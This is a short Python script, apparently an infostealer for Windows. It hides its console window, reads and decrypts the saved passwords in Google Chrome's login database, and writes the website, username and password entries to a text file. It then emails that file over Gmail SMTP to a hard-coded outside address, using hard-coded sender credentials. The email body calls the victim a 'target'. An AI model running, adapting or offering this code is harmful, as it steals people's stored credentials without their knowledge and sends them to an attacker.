from os import getenv
import sqlite3
import win32crypt
import os
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders


#We can use win32 console to hide the console
import win32console, win32gui
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

#lets access the database
conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data") #Default chrome location for details
cursor = conn.cursor()
conn.execute("PRAGMA busy_timeout = 300000")   # Added PRAGMA busy_timneout to wait for some other transaction to finish
cursor.execute('Select action_url, username_value, password_value FROM logins')
fp = open(r"Chromepass.txt", "a+")

# Write to the file
for result in cursor.fetchall():
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
    if password:
        fp.write('\nWebsite: '+result[0])
        fp.write('\nUsername: '+result[1])
        fp.write('\nPassword: ' + str(password))

## lets send the file now

#   for file in os.listdir("./"):
 #  if file.endswith(".txt"):
    fromaddr = "dummypython1@gmail.com"
    toaddr = "luisxciv@gmail.com"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Chrome text files"

    body = "Text files from target sent successfully"

    msg.attach(MIMEText(body, 'plain'))

    filename = "File.txt" # The filename it will have, you can comment this out
    attachment = open("./Chromepass.txt", "rb") #

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(fromaddr, "Testing-123")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
